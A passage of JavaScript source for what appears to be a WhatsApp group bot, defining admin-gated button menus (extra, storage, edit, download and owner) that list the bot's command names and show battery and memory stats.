‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
▯ ⍟ ${prefix}chat
▯ ⍟ ${prefix}fitnahpc
▯ ⍟ ${prefix}contact
▯ ⍟ ${prefix}forward
▯ ⍟ ${prefix}forwardvideo
▯ ⍟ ${prefix}forwardaudio
 ⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
⍟▭▭▭▭𝙸𝙼𝙰𝙶𝙴 𝙴𝙳𝙸𝚃𝙸𝙽𝙶▭▭▭‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
▯ ⍟ ${prefix}wanted
▯ ⍟ ${prefix}rejected
▯ ⍟ ${prefix}approved
▯ ⍟ ${prefix}blur
▯ ⍟ ${prefix}burn
▯ ⍟ ${prefix}rip
▯ ⍟ ${prefix}instagram
▯ ⍟ ${prefix}wasted
▯ ⍟ ${prefix}draw
▯ ⍟ ${prefix}sketch
 ⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
⍟▭▭▭▭𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄▭▭▭▭
▯ ⍟ ${prefix}setbgmpic
▯ ⍟ ${prefix}setthumb
▯ ⍟ ${prefix}clearall
▯ ⍟ ${prefix}clearchat
▯ ⍟ ${prefix}tobc
▯ ⍟ ${prefix}bc
▯ ⍟ ${prefix}getquoted
▯ ⍟ ${prefix}restart
▯ ⍟ ${prefix}term
▯ ⍟ ${prefix}block
▯ ⍟ ${prefix}unblock
▯ ⍟ ${prefix}leaveall
▯ ⍟ ${prefix}addcmd
▯ ⍟ ${prefix}delcmd
▯ ⍟ ${prefix}jadibot
▯ ⍟ ${prefix}listjadibot
▯ ⍟ ${prefix}stopjadibot
▯ ⍟ ${prefix}exif
▯ ⍟ ${prefix}join
▯ ⍟ ${prefix}return
▯ ⍟ ${prefix}public
▯ ⍟ ${prefix}self
▯ ⍟ ${prefix}readall
 ⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭ 
`
    allmenubutton = [{buttonId:`${prefix}help`,buttonText:{displayText:'➥ BACK'},type:1},
]
 allmenumessage = { contentText: `${teks}`, footerText: `⍟ @${sender.split("@")[0]} ⍟`, buttons: allmenubutton, headerType: 6, locationMessage: bosco2.message.locationMessage}
 bosco.sendMessage(from, allmenumessage, MessageType.buttonsMessage)
             break  
             case 'extramenu':
             if (!isGroupAdmins) return reply(mess.only.admin)
              bosco1 = await bosco.prepareMessage(from, fs.readFileSync('./ds.jpg'), location, {thumbnail: fs.readFileSync('./ds.jpg')})
              bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
              groups = bosco.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = bosco.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'charging' : 'not charging'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await bosco.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
     *Exᴛʀᴀ Mᴇɴᴜ*
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
  ㅤ００：１０ ━●━━━━━────４：０７

▯ 🗞️${prefix}chat
▯ 🗞️${prefix}fitnahpc
▯ 🗞️${prefix}contact
▯ 🗞️${prefix}forward
▯ 🗞️${prefix}forwardvideo
▯ 🗞️${prefix}forwardaudio
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
      𝙱𝙰𝚃𝚃𝙴𝚁𝚈 : ${baterai}% 
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟ 
`
    extramenubutton = [{buttonId:`${prefix}help`,buttonText:{displayText:'➥ BACK'},type:1},
]
 extramenumessage = { contentText: `${teks}`, footerText: `⍟ @${sender.split("@")[0]} ⍟`, buttons: extramenubutton, headerType: 6, locationMessage: bosco2.message.locationMessage}
 bosco.sendMessage(from, extramenumessage, MessageType.buttonsMessage)
             break  
              case 'storagemenu':
              if (!isGroupAdmins) return reply(mess.only.admin)
              bosco1 = await bosco.prepareMessage(from, fs.readFileSync('./ds.jpg'), location, {thumbnail: fs.readFileSync('./ds.jpg')})
              bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
              groups = bosco.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = bosco.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'charging' : 'not charging'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await bosco.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
     *Sᴛᴏʀᴀɢᴇ Mᴇɴᴜ*
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
  ㅤ００：１０ ━●━━━━━────４：０７

▯ 🗞️${prefix}addvn
▯ 🗞️${prefix}addvideo
▯ 🗞️${prefix}addimage
▯ 🗞️${prefix}addsticker
▯ 🗞️${prefix}listvn
▯ 🗞️${prefix}listvideo
▯ 🗞️${prefix}listimage
▯ 🗞️${prefix}liststicker
▯ 🗞️${prefix}delvn
▯ 🗞️${prefix}delvideo
▯ 🗞️${prefix}delimage
▯ 🗞️${prefix}delsticker
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
      𝙱𝙰𝚃𝚃𝙴𝚁𝚈 : ${baterai}% 
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟ 
`
    storagemenubutton = [{buttonId:`${prefix}help`,buttonText:{displayText:'➥ BACK'},type:1},
]
 storagemenumessage = { contentText: `${teks}`, footerText: `⍟ @${sender.split("@")[0]} ⍟`, buttons: storagemenubutton, headerType: 6, locationMessage: bosco2.message.locationMessage}
 bosco.sendMessage(from, storagemenumessage, MessageType.buttonsMessage)
             break  
              case 'editmenu':
              if (!isGroupAdmins) return reply(mess.only.admin)
              bosco1 = await bosco.prepareMessage(from, fs.readFileSync('./ds.jpg'), location, {thumbnail: fs.readFileSync('./ds.jpg')})
              bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
              groups = bosco.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = bosco.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'charging' : 'not charging'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await bosco.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
     *Eᴅɪᴛ Mᴇɴᴜ*
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
  ㅤ００：１０ ━●━━━━━────４：０７

▯ 🗞️${prefix}secvn
▯ 🗞️${prefix}secvideo
▯ 🗞️${prefix}tomp3
▯ 🗞️${prefix}tomp4
▯ 🗞️${prefix}toimg
▯ 🗞️${prefix}baby
▯ 🗞️${prefix}bass
▯ 🗞️${prefix}reverse
▯ 🗞️${prefix}slow
▯ 🗞️${prefix}squirrel
▯ 🗞️${prefix}blub
▯ 🗞️${prefix}fat
▯ 🗞️${prefix}imagetourl
▯ 🗞️${prefix}voice
▯ 🗞️${prefix}nightcore
▯ 🗞️${prefix}cm
▯ 🗞️${prefix}fast
▯ 🗞️${prefix}gemes
▯ 🗞️${prefix}slowvid
▯ 🗞️${prefix}fastvid
▯ 🗞️${prefix}reversevid
▯ 🗞️${prefix}tts
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
      𝙱𝙰𝚃𝚃𝙴𝚁𝚈 : ${baterai}% 
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟ 
`
    editmenubutton = [{buttonId:`${prefix}help`,buttonText:{displayText:'➥ BACK'},type:1},
]
 editmenumessage = { contentText: `${teks}`, footerText: `⍟ @${sender.split("@")[0]} ⍟`, buttons: editmenubutton, headerType: 6, locationMessage: bosco2.message.locationMessage}
 bosco.sendMessage(from, editmenumessage, MessageType.buttonsMessage)
             break  
             case 'downloadmenu':
             if (!isGroupAdmins) return reply(mess.only.admin)
              bosco1 = await bosco.prepareMessage(from, fs.readFileSync('./ds.jpg'), location, {thumbnail: fs.readFileSync('./ds.jpg')})
              bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
              groups = bosco.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = bosco.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'charging' : 'not charging'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await bosco.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
     *Dᴏᴡɴʟᴏᴀᴅ Mᴇɴᴜ*
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
  ㅤ００：１０ ━●━━━━━────４：０７

▯ 🗞️${prefix}play
▯ 🗞️${prefix}video
▯ 🗞️${prefix}ytshorts
▯ 🗞️${prefix}ytmp3
▯ 🗞️${prefix}ytmp4
▯ 🗞️${prefix}igdl
▯ 🗞️${prefix}ytsearch
▯ 🗞️${prefix}igstory
▯ 🗞️${prefix}scplay
▯ 🗞️${prefix}pinterest
▯ 🗞️${prefix}telesticker
▯ 🗞️${prefix}githubsearch
▯ 🗞️${prefix}googleimage
▯ 🗞️${prefix}ytdesk
▯ 🗞️${prefix}lyric
▯ 🗞️${prefix}playstore
▯ 🗞️${prefix}mediafire
▯ 🗞️${prefix}fb
▯ 🗞️${prefix}tiktoknown
▯ 🗞️${prefix}tiktokaudio
▯ 🗞️${prefix}tiktokdl
▯ 🗞️${prefix}twitter
▯ 🗞️${prefix}tinyurl
▯ 🗞️${prefix}google
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
      𝙱𝙰𝚃𝚃𝙴𝚁𝚈 : ${baterai}% 
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟ 
`
    downloadmenubutton = [{buttonId:`${prefix}help`,buttonText:{displayText:'➥ BACK'},type:1},
]
 downloadmenumessage = { contentText: `${teks}`, footerText: `⍟ @${sender.split("@")[0]} ⍟`, buttons: downloadmenubutton, headerType: 6, locationMessage: bosco2.message.locationMessage}
 bosco.sendMessage(from, downloadmenumessage, MessageType.buttonsMessage)
             break  
             case 'ownermenu':
             if (!isGroupAdmins) return reply(mess.only.admin)
              bosco1 = await bosco.prepareMessage(from, fs.readFileSync('./ds.jpg'), location, {thumbnail: fs.readFileSync('./ds.jpg')})
              bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
              groups = bosco.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = bosco.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              charger = `${charging ? 'charging' : 'not charging'}`
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await bosco.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
teks = `
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
     *Oᴡɴᴇʀ Mᴇɴᴜ*
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭⍟
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
 ㅤ００：１０ ━●━━━━━────４：０７

▯ 🗞️${prefix}setbgmpic
▯ 🗞️${prefix}setthumb
▯ 🗞️${prefix}clearall
▯ 🗞️${prefix}clearchat
▯ 🗞️${prefix}tobc
▯ 🗞️${prefix}bc
▯ 🗞️${prefix}getquoted
▯ 🗞️${prefix}restart
▯ 🗞️${prefix}term
▯ 🗞️${prefix}block
▯ 🗞️${prefix}unblock
▯ 🗞️${prefix}leaveall
▯ 🗞️${prefix}addcmd
▯ 🗞️${prefix}delcmd
▯ 🗞️${prefix}jadibot
▯ 🗞️${prefix}listjadibot
▯ 🗞️${prefix}stopjadibot
▯ 🗞️${prefix}exif
▯ 🗞️${prefix}join
▯ 🗞️${prefix}return
▯ 🗞️${prefix}public
▯ 🗞️${prefix}self
▯ 🗞️${prefix}readall
⍟▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭
